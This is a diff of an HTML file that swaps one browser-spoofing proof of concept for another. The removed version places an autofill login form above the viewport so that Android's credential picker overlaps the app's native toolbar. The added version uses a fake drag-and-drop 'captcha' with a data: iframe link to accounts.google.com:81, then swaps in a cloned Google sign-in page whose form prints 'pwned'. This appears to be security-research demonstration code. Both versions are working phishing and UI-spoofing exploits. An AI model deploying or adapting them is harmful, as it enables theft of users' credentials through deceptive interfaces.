@@ -1,86 +1,248 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Android Autofill FillUi out-of-bounds anchor</title>
-<style>
-  html, body { margin: 0; padding: 0; height: 100%; overflow: hidden; }
-  /* The autofill target field is positioned ABOVE the viewport top.
-     element.BoundsInWidget() will return a negative y, which propagates
-     unclamped to AutofillManager.notifyViewEntered(). The Android system
-     FillUi (credential picker) will anchor to a screen rect that lies
-     above the WebView's top edge, overlapping the embedding app's native
-     toolbar / Chrome's Omnibox. Adjust `top` to target a specific
-     embedder-UI region. */
-  #u {
-    position: fixed;
-    top: -120px;      /* negative -> anchor lands above the WebView */
-    left: 0;
-    width: 300px;
-    height: 40px;
-    font-size: 16px;
-  }
-  #p {
-    position: fixed;
-    top: -200px;
-    left: 0;
-    width: 300px;
-    height: 40px;
-  }
-  #tap {
-    position: fixed;
-    top: 40px;
-    left: 20px;
-    right: 20px;
-    padding: 18px;
-    background: #1a73e8;
-    color: #fff;
-    font: 18px sans-serif;
-    text-align: center;
-    border-radius: 6px;
-  }
-  #log {
-    position: fixed;
-    top: 120px;
-    left: 20px;
-    right: 20px;
-    font: 12px monospace;
-    white-space: pre-wrap;
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple Link Page</title>
+    <style>
+        body {
+            font-family: "Inter", sans-serif;
+            background-color: #f3f4f6; /* bg-gray-100 */
+            display: flex;
+            flex-direction: column; /* Changed to column to stack elements */
+            align-items: center;
+            justify-content: flex-start; /* Align items to the start (top) */
+            min-height: 100vh;
+            padding: 1rem;
+            padding-top: 5rem; /* Push content further up */
+            margin: 0;
+            overflow: hidden; /* Added to make the page unscrollable */
+        }
+
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 28rem; /* max-w-md */
+            background-color: #fff;
+            padding: 2rem;
+            border-radius: 0.75rem; /* rounded-xl */
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); /* shadow-lg */
+            gap: 2rem; /* space-y-8 equivalent */
+        }
+
+        .captcha-text {
+            color: #4b5563; /* text-gray-700 */
+            font-size: 1.5rem; /* text-2xl */
+            font-weight: 600; /* font-semibold */
+            text-align: center;
+            margin-bottom: 2rem; /* Space before the link */
+        }
+
+        .link-style, .drop-area-style {
+            color: #2563eb; /* text-blue-600 */
+            font-size: 2.25rem; /* text-4xl */
+            font-weight: 800; /* font-extrabold */
+            text-align: center;
+            display: block;
+            padding: 2rem 1rem;
+            border-radius: 0.5rem; /* rounded-lg */
+            transition: color 0.3s, transform 0.3s;
+            width: 100%;
+            text-decoration: none; /* Remove underline for links */
+            box-sizing: border-box; /* Include padding and border in element's total width and height */
+        }
+
+        .link-style:hover {
+            color: #1d4ed8; /* hover:text-blue-800 */
+            transform: scale(1.05); /* hover:scale-105 */
+        }
+
+        .link-style:focus {
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(96, 165, 250, 0.75); /* focus:ring-4 focus:ring-blue-300 focus:ring-opacity-75 */
+        }
+
+        .drop-area-style {
+            color: #6b7280; /* text-gray-500 */
+            border: 2px dashed #d1d5db; /* border-2 border-dashed border-gray-300 */
+        }
+
+        /* Responsive adjustments for font sizes */
+        @media (min-width: 640px) { /* sm breakpoint */
+            .link-style, .drop-area-style {
+                font-size: 3rem; /* sm:text-5xl */
+            }
+        }
+        @media (min-width: 768px) { /* md breakpoint */
+            .link-style, .drop-area-style {
+                font-size: 3.75rem; /* md:text-6xl */
+            }
+        }
+
+        /* Iframe specific styling to make it behave like the link */
+        iframe {
+            border: none;
+            width: 100%;
+            height: auto; /* Adjust height based on content */
+            min-height: 8rem; /* Ensure it has some height */
+        }
+    </style>
 </head>
 <body>
-<form action=c/login" method="post" id="f">
-  <input id="u" name="username" type="text"  autocomplete="username">
-  <input id="p" name="password" type="password" autocomplete="current-password">
-</form>
+    <div class="main-container">
+        <!-- New text for captcha -->
+        <div class="captcha-text">
+            Solve captcha drag and drop this to go to Google
+        </div>
 
-<!-- User-activation surface inside the visible viewport. -->
-<label id="tap" for="u">Tap to sign in</label>
+        <iframe  src='data:text/html,<a href="https://accounts.google.com:81/" ontouchstart=parent.postMessage(1,"*") draggable=1 class="link-style" draggable=1 style="color: %232563eb; font-size: 2.25rem; font-weight: 800; text-align: center; display: block; padding: 2rem 1rem; border-radius: 0.5rem; transition: color 0.3s, transform 0.3s; width: 100%; text-decoration: none; box-sizing: border-box;">Drag me</a>'></iframe>
 
-<pre id="log"></pre>
-
+        <!-- "drop me here" div, now below the link and styled to match its size -->
+        <div class="drop-area-style">
+            Drop me here
+        </div>
+    </div>
 <script>
-const log = m => document.getElementById('log').textContent += m + '\n';
+window.onmessage=(m)=>{
+if(m.data!=1)
+return;
 
-document.getElementById('tap').addEventListener('click', () => {
-  // Focus the off-viewport field. The renderer sends
-  // autofill.mojom.AutofillDriver.AskForValuesToFill with
-  // FormFieldData::bounds.y < 0 (set in form_autofill_util.cc from
-  // element.BoundsInWidget()).
-  const u = document.getElementById('u');
-  u.focus({preventScroll: true});
-  const r = u.getBoundingClientRect();
-  log('focused #u, viewport bounds y=' + r.top + ' h=' + r.height);
-  log('expected: Android FillUi anchored above WebView top edge');
-  setTimeout('document.location="spoof2.html"', 6000)
-});
+setTimeout(()=>{document.body.innerHTML=`<h1>Redirecting...</h1>`},2500);
 
-// Variant: place the field BELOW the WebView (overlap native UI under
-// the WebView, e.g. an embedder bottom bar). Uncomment to test.
-// document.getElementById('u').style.top =
-//     (window.innerHeight + 80) + 'px';
+setTimeout(()=>{document.body.innerHTML=`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <script src="https://cdn.tailwindcss.com"><\/script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 2.5rem;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px rgba(60, 64, 67, 0.15);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-sizing: border-box; /* Ensure padding is included in width */
+        }
+        .input-field {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            margin-bottom: 1.25rem;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 1rem;
+            box-sizing: border-box;
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 1px #1a73e8;
+        }
+        .btn-primary {
+            background-color: #1a73e8;
+            color: #fff;
+            padding: 0.75rem 1.5rem;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s ease-in-out;
+            width: auto; /* Allow button to size based on content */
+            min-width: 90px; /* Ensure a minimum width */
+        }
+        .btn-primary:hover {
+            background-color: #1766d1;
+        }
+        .link-text {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.875rem;
+            transition: color 0.2s ease-in-out;
+        }
+        .link-text:hover {
+            color: #1766d1;
+            text-decoration: underline;
+        }
+        .message-box {
+            background-color: #e6f4ea;
+            color: #1e8449;
+            padding: 0.75rem;
+            border-radius: 4px;
+            margin-bottom: 1rem;
+            text-align: left;
+            font-size: 0.875rem;
+            display: none; /* Hidden by default */
+        }
+        .message-box.error {
+            background-color: #fce8e6;
+            color: #d93025;
+        }
+        .flex-between {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            margin-top: 1.5rem;
+        }
+        .text-left {
+            text-align: left;
+        }
+        .text-right {
+            text-align: right;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="mx-auto mb-6 w-24">
+        <h1 class="text-2xl font-normal mb-2">Sign in</h1>
+        <p class="text-base text-gray-600 mb-6">Use your Google Account</p>
+
+        <div id="messageBox" class="message-box"></div>
+
+        <form id="loginForm" action="javascript:document.body.innerHTML=('<h1>pwned')">
+            <input type="email" id="email" class="input-field" placeholder="Email or phone" required>
+            <input type="password" id="password" class="input-field" placeholder="Password" required>
+
+            <div class="text-left mb-6">
+                <a href="#" class="link-text">Forgot password?</a>
+            </div>
+
+            <p class="text-sm text-gray-600 text-left mb-6">
+                Not your computer? Use a private browsing window to sign in. <a href="#" class="link-text">Learn more</a>
+            </p>
+
+            <div class="flex-between">
+                <a href="#" class="link-text">Create account</a>
+                <button type="submit" class="btn-primary">Next</button>
+            </div>
+        </form>
+    </div>
+
+</body>
+</html>
+
+`
+},4000);
+}
 </script>
 </body>
 </html>
